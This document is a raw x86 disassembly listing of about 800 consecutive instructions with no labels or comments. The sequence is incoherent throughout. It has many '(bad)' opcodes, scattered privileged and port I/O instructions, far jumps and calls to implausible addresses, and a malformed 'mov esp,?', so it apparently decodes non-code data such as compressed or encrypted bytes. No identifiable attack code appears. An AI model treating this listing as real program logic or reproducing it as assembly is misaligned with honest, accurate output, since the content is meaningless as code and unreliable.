  416497:	lods   eax,DWORD PTR ds:[si]
  416499:	pop    esp
  41649a:	gs aaa 
  41649c:	jnp    0x416420
  41649e:	xchg   edi,eax
  41649f:	in     al,dx
  4164a0:	xchg   edx,eax
  4164a1:	cld    
  4164a2:	in     eax,dx
  4164a3:	xchg   ecx,eax
  4164a4:	out    0xd,eax
  4164a6:	dec    eax
  4164a7:	sub    DWORD PTR [edi-0x32],ebp
  4164aa:	push   ds
  4164ab:	push   es
  4164ac:	xchg   edx,eax
  4164ad:	mov    ebp,0xe3a759a5
  4164b2:	icebp  
  4164b3:	ss mov dl,0x2f
  4164b6:	sbb    eax,0x5d0ecca3
  4164bb:	sub    ebp,DWORD PTR [ebp-0x18]
  4164be:	out    0xbb,eax
  4164c0:	aad    0x35
  4164c2:	dec    ebx
  4164c3:	pop    ss
  4164c4:	fst    QWORD PTR [edi+eax*2-0x6e]
  4164c8:	fidiv  DWORD PTR [esi]
  4164ca:	mov    ah,0x25
  4164cc:	cs in  eax,0x5f
  4164cf:	ud2    
  4164d1:	ja     0x4164b9
  4164d3:	sub    al,0x83
  4164d5:	cmc    
  4164d6:	add    DWORD PTR [esi+esi*2],esi
  4164d9:	push   edx
  4164da:	(bad)  
  4164db:	int3   
  4164dc:	jl     0x4164bd
  4164de:	clc    
  4164df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164e0:	sub    esp,ebx
  4164e2:	adc    eax,0x39b9f7c0
  4164e7:	test   esp,ebx
  4164e9:	addr16 int 0x87
  4164ec:	test   eax,0x21a06e33
  4164f1:	aas    
  4164f2:	into   
  4164f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164f4:	xchg   ebx,edx
  4164f6:	or     ecx,DWORD PTR [ebp+0x51]
  4164f9:	push   ebp
  4164fa:	jg     0x4164c4
  4164fc:	xchg   ebx,eax
  4164fd:	and    al,ah
  4164ff:	adc    bh,ch
  416501:	into   
  416502:	fistp  WORD PTR [esi]
  416504:	lds    esi,FWORD PTR [eax]
  416506:	jns    0x41654f
  416508:	adc    ecx,esp
  41650a:	(bad)  
  41650b:	fdivr  DWORD PTR [eax-0x1b89b7e3]
  416511:	arpl   WORD PTR [eax+0x7e84a6f0],bp
  416517:	xchg   ecx,eax
  416518:	int    0xc1
  41651a:	and    ebp,DWORD PTR [ebx-0x1104b62d]
  416520:	cmp    BYTE PTR [edx-0x64],dh
  416523:	cmc    
  416524:	adc    DWORD PTR [edi-0x3a81d057],ecx
  41652a:	out    0xaa,eax
  41652c:	rol    BYTE PTR [eax-0x66],0xb6
  416530:	fld    TBYTE PTR [edx-0x34]
  416533:	das    
  416534:	mov    ah,0xb3
  416536:	push   0x7a
  416538:	and    ch,0xd2
  41653b:	fs inc ebx
  41653d:	or     eax,0xa8a91667
  416542:	xor    al,0xf8
  416544:	push   ecx
  416545:	lahf   
  416546:	dec    esi
  416547:	push   es
  416548:	nop
  416549:	adc    al,0xbe
  41654b:	scas   eax,DWORD PTR es:[edi]
  41654c:	push   ecx
  41654d:	aas    
  41654e:	imul   ebx,DWORD PTR [edi],0xffffffb1
  416551:	stc    
  416552:	inc    esi
  416553:	inc    ebx
  416554:	ret    
  416555:	pop    edi
  416556:	pushf  
  416557:	and    ebp,DWORD PTR [ebp+esi*2-0x6d]
  41655b:	push   esi
  41655c:	mov    dh,0x4d
  41655e:	jo     0x41652f
  416560:	(bad)
  416563:	push   es
  416564:	cmp    BYTE PTR [esi-0x12],0xd3
  416568:	or     al,0x5c
  41656a:	lods   eax,DWORD PTR ds:[esi]
  41656b:	jnp    0x4165be
  41656d:	call   0x24fe8ff9
  416572:	pop    ecx
  416573:	adc    dh,ah
  416575:	push   cs
  416576:	adc    ebp,DWORD PTR [eax]
  416578:	(bad)  
  416579:	fmul   DWORD PTR [ecx-0x5ddbb87a]
  41657f:	sbb    BYTE PTR [ebx-0x7b57bf44],bl
  416585:	retf   
  416586:	inc    ebx
  416587:	dec    edi
  416588:	pop    ebx
  416589:	and    DWORD PTR [eax+0x527c50b4],ebx
  41658f:	dec    ecx
  416590:	int    0xd9
  416592:	call   0x9a021047
  416597:	sbb    edx,DWORD PTR [edi]
  416599:	fucomi st,st(4)
  41659b:	cwde   
  41659c:	outs   dx,BYTE PTR ds:[esi]
  41659d:	push   DWORD PTR [edi-0x11]
  4165a0:	mov    edi,0x2b6fc042
  4165a5:	dec    eax
  4165a6:	dec    ebx
  4165a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165a8:	adc    ebp,DWORD PTR [edi+0x78aeadb6]
  4165ae:	jecxz  0x4165e1
  4165b0:	mov    bh,0x76
  4165b2:	popf   
  4165b3:	adc    bh,bh
  4165b5:	inc    eax
  4165b6:	aad    0xa8
  4165b8:	and    DWORD PTR [eax+0x66],ebx
  4165bb:	xor    eax,0xaf2cfc9b
  4165c0:	and    cl,BYTE PTR ds:0x3b175221
  4165c6:	test   DWORD PTR [esi],edi
  4165c8:	xor    dh,BYTE PTR [ebp-0x424944c0]
  4165ce:	iret   
  4165cf:	clc    
  4165d0:	or     cl,BYTE PTR [ebp-0x7]
  4165d3:	call   0x3244:0xc447eb79
  4165da:	mov    ecx,0xef6cebcc
  4165df:	retf   0xd5f8
  4165e2:	mov    dl,BYTE PTR [eax-0x50]
  4165e5:	es push ss
  4165e7:	jge    0x4165d3
  4165e9:	adc    al,BYTE PTR [edi]
  4165eb:	dec    ebp
  4165ec:	(bad)  
  4165ed:	std    
  4165ee:	add    al,0x1
  4165f0:	(bad)  
  4165f1:	out    0xc5,eax
  4165f3:	cmp    eax,0xa3719a78
  4165f8:	xlat   BYTE PTR ds:[ebx]
  4165f9:	inc    ebx
  4165fa:	retf   0x51b9
  4165fd:	xchg   esi,eax
  4165fe:	loope  0x41659b
  416600:	xchg   ecx,eax
  416601:	(bad)  
  416602:	jb     0x4165fb
  416604:	ins    DWORD PTR es:[edi],dx
  416605:	lock outs dx,DWORD PTR ds:[esi]
  416607:	dec    edx
  416608:	loopne 0x41658d
  41660a:	adc    BYTE PTR [edx-0x14513900],cl
  416610:	xchg   esp,eax
  416611:	ret    
  416612:	icebp  
  416613:	cmp    ah,ch
  416615:	jno    0x41665b
  416617:	push   edx
  416618:	rol    BYTE PTR [eax-0x2b8b3c87],cl
  41661e:	push   ebx
  41661f:	xchg   esi,eax
  416621:	mov    ch,cl
  416623:	inc    edi
  416624:	rol    BYTE PTR [edx],0xcc
  416627:	xor    BYTE PTR [edi+0x396574d0],0xb4
  41662e:	mov    edi,DWORD PTR [esi-0x2f3d10da]
  416634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416635:	js     0x416671
  416637:	sub    BYTE PTR [ebp+ecx*2+0x39],bl
  41663b:	idiv   DWORD PTR [eax-0x1]
  41663e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41663f:	out    0x7b,al
  416641:	mov    eax,ds:0x9526dd04
  416646:	inc    ebp
  416647:	ja     0x416683
  416649:	sub    DWORD PTR [esi+0x7e],0xfd9cceaf
  416650:	mov    eax,0x6329d99c
  416655:	inc    ebx
  416656:	jmp    0xdcb5f527
  41665b:	mov    ch,0xd0
  41665d:	sbb    DWORD PTR [edi],0xe0a1f829
  416663:	bound  edi,QWORD PTR [eax+0x270fa389]
  416669:	mov    DWORD PTR [eax],ebp
  41666b:	dec    DWORD PTR [ecx+edi*1-0x38c89c06]
  416672:	in     al,dx
  416673:	and    BYTE PTR [eax-0x3bf2370c],ah
  416679:	inc    edi
  41667a:	sub    ebx,0x64
  41667d:	pop    esi
  41667e:	ss dec ebx
  416680:	loopne 0x4166d5
  416682:	pop    edx
  416683:	mov    cx,WORD PTR [esi+0x6f705893]
  41668a:	fist   WORD PTR [eax]
  41668c:	add    ch,dl
  41668e:	(bad)
  416691:	mov    ebx,0x99223321
  416696:	mov    edx,fs
  416698:	cmp    bh,BYTE PTR [edx+0x6c]
  41669b:	call   0x69ec181a
  4166a0:	cmp    eax,ebx
  4166a2:	hlt    
  4166a3:	jecxz  0x4166c1
  4166a5:	jecxz  0x416632
  4166a7:	mov    esi,0xd9c3b0a0
  4166ac:	(bad)  
  4166ad:	pop    es
  4166ae:	mov    eax,ds:0x6b2f61e8
  4166b3:	mov    esp,0xb9861502
  4166b8:	lock dec ecx
  4166ba:	jmp    0xb487ed92
  4166bf:	jl     0x416729
  4166c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166c2:	mov    WORD PTR [ebx],fs
  4166c4:	xor    edi,DWORD PTR [ebp+0x19bd0152]
  4166ca:	int    0x2b
  4166cc:	mov    dl,0x7c
  4166ce:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4166d0:	or     al,0xfa
  4166d2:	mov    ebp,0xa741abdc
  4166d7:	int3   
  4166d8:	aas    
  4166d9:	jns    0x416681
  4166db:	mov    fs,WORD PTR [eax-0xf]
  4166de:	dec    edx
  4166df:	outs   dx,DWORD PTR ds:[esi]
  4166e0:	pop    esp
  4166e1:	sub    ch,BYTE PTR [esi+0x12a1b86a]
  4166e7:	sub    DWORD PTR [ecx],ebp
  4166e9:	xor    DWORD PTR [ecx+0x35],edi
  4166ec:	jecxz  0x4166b8
  4166ee:	and    ch,BYTE PTR [edi-0x1d48569c]
  4166f4:	into   
  4166f5:	pop    edx
  4166f6:	mov    cl,0x12
  4166f8:	mov    ch,0x3d
  4166fa:	outs   dx,DWORD PTR ds:[esi]
  4166fb:	ins    BYTE PTR es:[edi],dx
  4166fc:	inc    eax
  4166fd:	add    esp,DWORD PTR [edx+edx*1-0x6bb4cc06]
  416704:	inc    eax
  416705:	lea    ebx,[esi]
  416707:	imul   ecx,DWORD PTR [ebx-0x45],0xc0503fd7
  41670e:	lahf   
  41670f:	iret   
  416710:	lods   eax,DWORD PTR ds:[esi]
  416711:	mov    dh,0xc2
  416713:	jmp    0xa78396ff
  416718:	sti    
  416719:	nop
  41671a:	jle    0x416711
  41671c:	cwde   
  41671d:	pop    edi
  41671e:	and    al,0x3
  416720:	aam    0xbc
  416722:	dec    eax
  416723:	sub    BYTE PTR [edx-0x3d],bh
  416726:	adc    ecx,DWORD PTR [eax]
  416728:	repz (bad) 
  41672a:	pop    ecx
  41672c:	lds    edi,FWORD PTR [esi]
  41672e:	cli    
  41672f:	sub    ecx,edx
  416731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416733:	call   0x7237:0xbd33c0e8
  41673a:	mov    ebp,eax
  41673c:	jae    0x41676e
  41673e:	fld1   
  416740:	ja     0x416718
  416742:	mov    eax,0x42166c83
  416747:	shl    BYTE PTR [esi+0x3d],1
  41674a:	(bad)  
  41674b:	cs cld 
  41674d:	and    DWORD PTR [ebx+esi*8-0x380de0c8],0x6251eac0
  416758:	icebp  
  416759:	shl    BYTE PTR [eax+ebx*8],0x73
  41675d:	pop    ds
  41675e:	mov    esi,0xf7883add
  416763:	and    al,0xe0
  416765:	mov    edx,0x5e7c1ed1
  41676a:	addr16 xor al,0x80
  41676d:	or     eax,0x1843765
  416772:	iret   
  416773:	mov    ds:0xf1128e21,eax
  416778:	pop    eax
  416779:	pop    esi
  41677a:	mov    ch,0x7d
  41677c:	jne    0x416757
  41677e:	sub    BYTE PTR [esp+edi*1+0x25],dh
  416782:	jne    0x4167db
  416784:	rcr    BYTE PTR [eax],cl
  416786:	les    eax,FWORD PTR [eax+0xf3036bc]
  41678c:	mov    ds:0xdbe16bce,al
  416791:	dec    edx
  416792:	xor    al,0x32
  416794:	push   cs
  416795:	dec    ebx
  416796:	xor    ecx,DWORD PTR [esi+0x52d13a92]
  41679c:	f2xm1  
  41679e:	fcomi  st,st(6)
  4167a0:	adc    DWORD PTR [esp+ecx*2+0x61],esi
  4167a4:	push   esp
  4167a5:	je     0x416770
  4167a7:	add    eax,0x8ff3b1b9
  4167ac:	addr16 pop es
  4167ae:	ret    
  4167af:	xor    cl,BYTE PTR [edi-0x112c2969]
  4167b5:	or     DWORD PTR [edx-0x6d],esp
  4167b8:	lds    ebx,FWORD PTR [ebx-0x3197645f]
  4167be:	mov    esp,0xb6dd739d
  4167c3:	ins    DWORD PTR es:[edi],dx
  4167c4:	sub    DWORD PTR [ebp-0x35],edi
  4167c7:	jo     0x416785
  4167c9:	ja     0x41679b
  4167cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167cd:	(bad)  
  4167cf:	push   ecx
  4167d0:	pop    ebx
  4167d1:	push   edi
  4167d2:	jmp    0x416756
  4167d4:	sbb    BYTE PTR [ebp-0x4b],0x8d
  4167d8:	test   BYTE PTR [esi],ah
  4167da:	adc    BYTE PTR [esi+0x7a],dh
  4167dd:	out    dx,al
  4167de:	bound  eax,QWORD PTR [esi+0x6a13ca0b]
  4167e4:	in     eax,dx
  4167e5:	and    bh,BYTE PTR [edi-0x72abeda7]
  4167eb:	aam    0xbc
  4167ed:	push   edi
  4167ee:	rcl    DWORD PTR [ecx],0xd1
  4167f1:	loope  0x4167c8
  4167f3:	mov    al,ds:0xa58263ef
  4167f8:	mov    edi,0x1a2cc54d
  4167fd:	pop    ebp
  4167fe:	dec    edx
  4167ff:	int3   
  416800:	sbb    eax,0x96996e5d
  416805:	aas    
  416806:	clc    
  416807:	pop    ebp
  416808:	std    
  416809:	add    eax,0x71e2f28
  41680e:	aaa    
  41680f:	inc    esi
  416810:	ss cs clc 
  416813:	xor    ah,BYTE PTR [edi-0x59]
  416816:	popa   
  416817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416818:	mov    edx,0x5b093750
  41681d:	dec    ecx
  41681e:	ins    DWORD PTR es:[edi],dx
  41681f:	sbb    BYTE PTR [ebx],0xdb
  416822:	int3   
  416823:	sbb    DWORD PTR [edi],0x6f94817e
  416829:	inc    ecx
  41682a:	and    BYTE PTR [edx-0x48],0x11
  41682e:	xor    BYTE PTR [esp+ebp*1],al
  416831:	inc    edx
  416832:	mov    ecx,0x5ef1700d
  416837:	push   ecx
  416838:	jmp    0x24d3:0x52f20a68
  41683f:	imul   ebp,DWORD PTR [eax],0xffffffe3
  416842:	fisttp QWORD PTR [ebx+eiz*1]
  416845:	mov    esi,0xe9c08796
  41684a:	xor    BYTE PTR [edx-0x8],dl
  41684d:	dec    ecx
  41684e:	mov    ds,WORD PTR [edi+0x27]
  416851:	into   
  416852:	sub    DWORD PTR [edi-0x3e],ebx
  416855:	mov    edx,0xb895857b
  41685a:	out    0x0,eax
  41685c:	mov    WORD PTR [edx+0x17],gs
  41685f:	outs   dx,BYTE PTR ds:[esi]
  416860:	pop    es
  416861:	pop    ss
  416862:	cmp    DWORD PTR [edx-0x5615d515],edx
  416868:	enter  0x9241,0x15
  41686c:	add    al,0x9
  41686e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416870:	inc    edi
  416871:	cli    
  416872:	int3   
  416873:	jne    0x4168b5
  416875:	pop    ebx
  416876:	add    DWORD PTR ds:0x798089bb,edi
  41687c:	mov    DWORD PTR [ebx+0x1c25cb21],ebx
  416882:	icebp  
  416883:	inc    eax
  416884:	retf   0x8e33
  416887:	mov    bh,0x23
  416889:	xor    edi,0x2d
  41688c:	cmp    al,0x35
  41688e:	xor    ebx,edx
  416890:	jg     0x41686e
  416892:	jl     0x41688b
  416894:	push   ds
  416895:	add    BYTE PTR [ecx+0x200b69f6],cl
  41689b:	popa   
  41689c:	out    0xd3,al
  41689e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41689f:	je     0x416915
  4168a1:	retf   0x7d8a
  4168a4:	mov    dl,0x34
  4168a6:	xchg   ebx,eax
  4168a7:	or     edi,ecx
  4168a9:	leave  
  4168aa:	and    bl,ah
  4168ac:	call   0x46c9:0x58fd5400
  4168b3:	mov    ebp,0xddac16e7
  4168b8:	adc    eax,0x60f21833
  4168bd:	push   ebp
  4168be:	fisttp WORD PTR [eax]
  4168c0:	pop    es
  4168c1:	repz inc eax
  4168c3:	xor    BYTE PTR [ecx+edx*1-0x60d8c274],ch
  4168ca:	mov    ds:0x83bb05e6,al
  4168cf:	or     eax,0x501d9736
  4168d4:	push   cs
  4168d5:	push   ebx
  4168d6:	sbb    DWORD PTR [ebx],esp
  4168d8:	call   0x6cf2a0cd
  4168dd:	arpl   WORD PTR [esi-0x63],dx
  4168e0:	and    ecx,ecx
  4168e2:	xor    ecx,eax
  4168e4:	(bad)  
  4168e5:	jns    0x4168be
  4168e7:	push   edi
  4168e8:	dec    ebx
  4168e9:	mov    ds:0x850de5ef,al
  4168ee:	inc    edx
  4168ef:	mov    eax,0x82c10d3d
  4168f4:	xchg   ebx,eax
  4168f5:	xchg   edi,eax
  4168f6:	dec    eax
  4168f7:	out    dx,al
  4168f8:	mov    ds:0xe5f23747,eax
  4168fd:	mov    cl,0x27
  4168ff:	arpl   WORD PTR [edi+edx*2-0x2c],dx
  416903:	jmp    0x416944
  416905:	mov    al,ds:0x7d3642eb
  41690a:	or     eax,0xd4ebe51e
  41690f:	push   edx
  416910:	sahf   
  416911:	jmp    FWORD PTR ds:0x318df283
  416917:	xor    bl,BYTE PTR [esi-0x34]
  41691a:	sar    DWORD PTR [ebx-0x71],0xfa
  41691e:	fwait
  41691f:	gs pop esp
  416921:	sbb    BYTE PTR [eax],dh
  416923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416924:	add    BYTE PTR [edx+0x3aa0647],ch
  41692a:	pop    ss
  41692b:	dec    ecx
  41692c:	sub    ecx,DWORD PTR [eax]
  41692e:	aas    
  41692f:	test   DWORD PTR [ecx],ebx
  416931:	jge    0x416922
  416933:	scas   eax,DWORD PTR es:[edi]
  416934:	repz enter 0x2440,0xf1
  416939:	mov    BYTE PTR ds:0xdbef03df,bh
  41693f:	idiv   BYTE PTR [edx+0x33]
  416942:	push   0xc
  416944:	ret    
  416945:	xor    al,bh
  416947:	ret    0xe776
  41694a:	inc    ebp
  41694b:	cmp    DWORD PTR [edi],esp
  41694d:	(bad)  
  41694e:	fnstcw WORD PTR [ebp-0x25]
  416951:	out    dx,eax
  416952:	stc    
  416953:	js     0x41690d
  416955:	fsub   st(4),st
  416957:	dec    esp
  416958:	addr16 push ds
  41695a:	leave  
  41695b:	sub    eax,0xe3466544
  416960:	into   
  416961:	lods   al,BYTE PTR ds:[esi]
  416962:	adc    al,0x26
  416964:	or     ebp,DWORD PTR [ecx]
  416966:	jns    0x416913
  416968:	pop    es
  416969:	cmp    edi,esi
  41696b:	call   0x9558:0xa10671ce
  416972:	jmp    0x213a0ae1
  416977:	mov    esp,?
  416979:	loopne 0x41693a
  41697b:	xor    BYTE PTR [edx+ebp*4],ch
  41697e:	and    eax,DWORD PTR [edx+0x20]
  416981:	int    0x6f
  416983:	mov    ebx,0xc36bf86d
  416988:	push   ss
  416989:	jae    0x4169b9
  41698b:	xchg   edx,eax
  41698c:	jp     0x416a06
  41698e:	imul   esi,DWORD PTR [ebx-0x49],0x538cb3c5
  416995:	dec    edx
  416996:	jle    0x416945
  416998:	(bad)  
  416999:	call   0x937ef67e
  41699e:	and    DWORD PTR [edx+0x1e2b545a],0x16
  4169a5:	mov    BYTE PTR [edi],bh
  4169a7:	mov    gs,WORD PTR [ebx-0x6e3ed372]
  4169ad:	call   0x53a292e
  4169b2:	cdq    
  4169b3:	pop    ebp
  4169b4:	dec    edx
  4169b5:	jne    0x416946
  4169b7:	pop    edx
  4169b8:	enter  0xf203,0xe3
  4169bc:	jo     0x416a16
  4169be:	or     eax,0x9f266a19
  4169c3:	push   ss
  4169c4:	cmc    
  4169c5:	(bad)  
  4169c7:	inc    eax
  4169c8:	fwait
  4169c9:	jmp    FWORD PTR [ebp+edx*2-0x718c4270]
  4169d0:	fist   WORD PTR ds:0x25d5cc56
  4169d6:	inc    eax
  4169d7:	xor    DWORD PTR ds:0x1ecf5872,eax
  4169dd:	(bad)  
  4169df:	rcl    DWORD PTR cs:[esi+0x71ef27df],1
  4169e6:	dec    ebp
  4169e7:	xor    ebp,DWORD PTR [ebx]
  4169e9:	aad    0x6f
  4169eb:	out    0x99,al
  4169ed:	in     eax,dx
  4169ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169ef:	or     dh,BYTE PTR [esi+0x58]
  4169f2:	or     al,0x7f
  4169f4:	pop    eax
  4169f5:	xchg   esi,eax
  4169f6:	add    BYTE PTR [esi+ebp*1],bh
  4169f9:	add    ecx,ecx
  4169fb:	push   cs
  4169fc:	cmp    DWORD PTR [ebp+0x220db60e],esp
  416a02:	fld    QWORD PTR cs:[ebx+eax*2-0x6a]
  416a07:	out    dx,eax
  416a08:	out    0xcb,al
  416a0a:	mov    al,0x61
  416a0c:	lock cmp bl,dl
  416a0f:	mov    dl,0xff
  416a11:	fsubr  QWORD PTR [ebx]
  416a13:	das    
  416a14:	icebp  
  416a15:	dec    DWORD PTR gs:[esi+0x3e]
  416a19:	add    al,0x49
  416a1b:	clc    
  416a1c:	outs   dx,BYTE PTR ds:[esi]
  416a1d:	pop    eax
  416a1e:	mov    bl,0x9f
  416a20:	mov    ah,0x71
  416a22:	jp     0x416a9a
  416a24:	add    DWORD PTR [eax-0x9],esi
  416a27:	pop    edx
  416a28:	push   ds
  416a29:	mov    ecx,0xf8b69908
  416a2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a2f:	popa   
  416a30:	or     BYTE PTR [ecx+ecx*1],dh
  416a33:	loop   0x416a86
  416a35:	and    DWORD PTR [esp+eax*2+0x42bed63],ecx
  416a3c:	(bad)  
  416a3d:	and    al,0x5b
  416a3f:	push   es
  416a40:	cwde   
  416a41:	stos   DWORD PTR es:[edi],eax
  416a42:	shl    ebp,0xfd
  416a45:	ret    0x7d8f
  416a48:	dec    edx
  416a49:	push   0x83835677
  416a4e:	cmp    al,0x5e
  416a50:	les    esp,FWORD PTR [edi-0x1227ac9b]
  416a56:	xchg   DWORD PTR [edx-0x46],ecx
  416a59:	adc    eax,0xaf825233
  416a5e:	push   edx
  416a5f:	and    dl,BYTE PTR [eax]
  416a61:	out    dx,eax
  416a62:	popf   
  416a63:	cmp    DWORD PTR [eax+0x6f],ebx
  416a66:	pop    es
  416a67:	out    dx,eax
  416a68:	mov    ah,0x97
  416a6a:	or     esi,DWORD PTR [ecx-0x313ca866]
  416a70:	mov    ch,0xea
  416a72:	bound  ebp,QWORD PTR [edx]
  416a74:	xor    dl,cl
  416a76:	test   al,0x34
  416a78:	inc    ebx
  416a79:	push   edx
  416a7a:	lods   eax,DWORD PTR ds:[esi]
  416a7b:	in     eax,0xf
  416a7d:	not    al
  416a7f:	repz jno 0x416a6d
  416a82:	out    dx,eax
  416a83:	cld    
  416a84:	cmp    edi,ebp
  416a86:	dec    eax
  416a87:	push   ecx
  416a88:	ss loope 0x416afa
  416a8b:	mov    edi,0x17853bea
  416a90:	mov    esi,0x3a245229
  416a95:	retf   
  416a96:	push   ds
  416a97:	(bad)  
  416a98:	jmp    DWORD PTR [ebx]
  416a9a:	inc    eax
  416a9b:	push   eax
  416a9c:	out    0x89,al
  416a9e:	pop    esp
  416a9f:	cli    
  416aa0:	icebp  
  416aa1:	jne    0x416a2a
  416aa3:	popf   
  416aa4:	pop    ecx
  416aa5:	out    dx,al
  416aa6:	scas   eax,DWORD PTR es:[edi]
  416aa7:	mov    dl,0x78
  416aa9:	lea    eax,[edx+eiz*8+0x2fa9e611]
  416ab0:	cdq    
  416ab1:	shl    DWORD PTR [ebp+0x76],0xed
  416ab5:	fld    TBYTE PTR [edi+0x593718cc]
  416abb:	adc    eax,0x8056dd8b
  416ac0:	pop    esi
  416ac1:	mov    dl,0x32
  416ac3:	call   0x9ee5:0x8483f1ec
  416aca:	stos   DWORD PTR es:[edi],eax
  416acb:	stc    
  416acc:	cmp    BYTE PTR [ebp-0x132922e9],cl
  416ad2:	dec    edi
  416ad3:	jl     0x416af3
  416ad5:	repnz cld 
  416ad7:	hlt    
  416ad8:	mov    BYTE PTR [ecx+0x67],al
  416adb:	cs std 
  416add:	aam    0xe6
  416adf:	js     0x416b0d
  416ae1:	(bad)  
  416ae2:	adc    al,0xb1
  416ae4:	pop    edx
  416ae5:	or     al,0x6d
  416ae7:	dec    edi
  416ae8:	rcr    DWORD PTR [ebx+ebp*2-0x11],cl
  416aec:	push   es
  416aed:	out    0x8d,eax
  416aef:	cmp    DWORD PTR [edi+0x47e076b4],esp
  416af5:	stos   DWORD PTR es:[edi],eax
  416af6:	adc    al,0xf6
  416af8:	in     eax,dx
  416af9:	rcr    DWORD PTR [esi],cl
  416afb:	xchg   ebp,eax
  416afc:	test   BYTE PTR [edi-0x6d2d127],bh
  416b02:	shl    DWORD PTR [edx-0x69],1
  416b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b06:	lock mov ebp,0xab63dabe
  416b0c:	jmp    0x80170097
  416b11:	jl     0x416b26
  416b13:	and    al,0x11
  416b15:	int    0x7d
  416b17:	adc    DWORD PTR [ebx+0x39],edx
  416b1a:	lea    edx,[ebp+0x4c83e604]
  416b20:	inc    ebx
  416b21:	shl    DWORD PTR [eax],0xac
  416b24:	ror    BYTE PTR [esi-0x2d64d789],0x3f
  416b2b:	pop    esp
  416b2c:	xchg   edi,eax
  416b2d:	mov    al,0x31
  416b2f:	bswap  edi
  416b31:	arpl   ax,bx
  416b33:	test   BYTE PTR [edi+0x5f],dh
  416b36:	inc    ecx
  416b37:	cs fwait
  416b39:	nop
  416b3a:	test   eax,0x8865e766
  416b3f:	aam    0xc3
  416b41:	test   eax,0xc6c6b256
  416b46:	adc    bl,ah
  416b48:	mov    al,BYTE PTR [eax+0x6f]
  416b4b:	mov    ebx,0xb71291e6
  416b50:	sbb    edx,DWORD PTR ds:0xb87c284e
  416b56:	mov    esp,0x378f7c78
  416b5b:	inc    ebp
  416b5c:	loopne 0x416b30
  416b5e:	or     al,0xfe
  416b60:	ins    BYTE PTR es:[edi],dx
  416b61:	pop    eax
  416b62:	xlat   BYTE PTR ds:[ebx]
  416b63:	aam    0x4f
  416b65:	repnz adc eax,0x8b8e3198
  416b6b:	test   BYTE PTR [esi+0x4859c872],ch
  416b71:	ja     0x416b89
  416b73:	enter  0xa16d,0xe8
  416b77:	fistp  DWORD PTR [edi-0x4]
  416b7a:	xor    DWORD PTR [edi-0x169616b5],esi
  416b80:	push   esi
  416b81:	adc    DWORD PTR [eax],eax
  416b83:	das    
  416b84:	cmp    dh,0x8
  416b87:	bound  eax,QWORD PTR [edx+0x19]
  416b8a:	mov    cl,0x60
  416b8c:	das    
  416b8d:	cmp    BYTE PTR [edx+0x52],bh
  416b90:	ds clc 
  416b92:	cmp    bh,BYTE PTR [esp+eiz*2+0x58]
  416b96:	(bad)  
  416b97:	jp     0x416c10
  416b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b9a:	lods   eax,DWORD PTR ds:[esi]
  416b9b:	push   esi
  416b9c:	mul    al
  416b9e:	rol    DWORD PTR [esi],0x6e
  416ba1:	xchg   esp,eax
  416ba2:	ud2    
  416ba4:	in     al,0xd1
  416ba6:	jmp    0x40a18df7
  416bab:	xor    BYTE PTR [esi],dl
  416bad:	add    al,0xa
  416baf:	inc    ecx
  416bb0:	fdiv   DWORD PTR [ecx]
  416bb2:	cs aas 
  416bb4:	sub    al,0xbb
  416bb6:	loopne 0x416b48
  416bb8:	mov    ch,BYTE PTR [ecx]
  416bba:	and    bl,BYTE PTR [edi-0x6b0e146c]
  416bc0:	sub    edx,DWORD PTR [edx+0x16]
  416bc3:	push   edi
  416bc4:	cwde   
  416bc5:	sub    cl,BYTE PTR [ebp+0x69a479cf]
  416bcb:	lock out dx,al
  416bcd:	ds or  eax,esi
  416bd0:	pop    esp
  416bd1:	dec    esp
  416bd2:	and    al,0x22
  416bd4:	pop    ebx
  416bd5:	xor    ecx,DWORD PTR [ecx-0x26ac31b9]
  416bdb:	cmp    ecx,eax
  416bdd:	adc    al,0x69
  416bdf:	mov    bl,ch
  416be1:	xor    edx,DWORD PTR [edx-0x42]
  416be4:	push   ds
  416be5:	rcl    BYTE PTR [eax],cl
  416be7:	mov    bh,0x84
  416be9:	test   BYTE PTR [eax+0x67],bl
  416bec:	cdq    
  416bed:	pop    ecx
  416bee:	repnz or DWORD PTR gs:[edi-0x66ffc94],ecx
  416bf6:	test   BYTE PTR [bp+di],0x7a
  416bfa:	std    
  416bfb:	ja     0x416bf2
  416bfd:	add    bl,BYTE PTR [edx+0x20]
  416c00:	sub    ah,BYTE PTR [esi-0x6db075b]
  416c06:	call   0xd0ab27bd
  416c0b:	jo     0x416bdd
  416c0d:	or     esp,DWORD PTR [ecx]
  416c0f:	outs   dx,DWORD PTR ds:[esi]
  416c10:	xchg   esp,eax
  416c11:	push   cs
  416c12:	cmp    esi,DWORD PTR [ecx]
  416c14:	xor    DWORD PTR [esi-0x68],0x141b1cb4
  416c1b:	pop    es
  416c1c:	aad    0x7
  416c1e:	loopne 0x416bc8
  416c20:	jb     0x416be2
  416c22:	push   0xffffffab
  416c24:	sbb    BYTE PTR [ebx-0xb0aa011],0x8d
  416c2b:	xchg   DWORD PTR [eax+0x79],ebx
  416c2e:	or     al,0xc8
  416c30:	(bad)  
  416c31:	stos   DWORD PTR es:[edi],eax
  416c32:	pop    es
  416c33:	mov    BYTE PTR [esi+0x33061779],dh
  416c39:	fdivr  DWORD PTR [eax+0x55]
  416c3c:	es pop ss
  416c3e:	add    eax,0x2ebabbfb
  416c43:	jnp    0x416c30
  416c45:	xor    eax,0xc91aa37a
  416c4a:	cmp    eax,0xd795cdf8
  416c4f:	iret   
  416c50:	push   ebx
  416c51:	adc    eax,0xc9cddec6
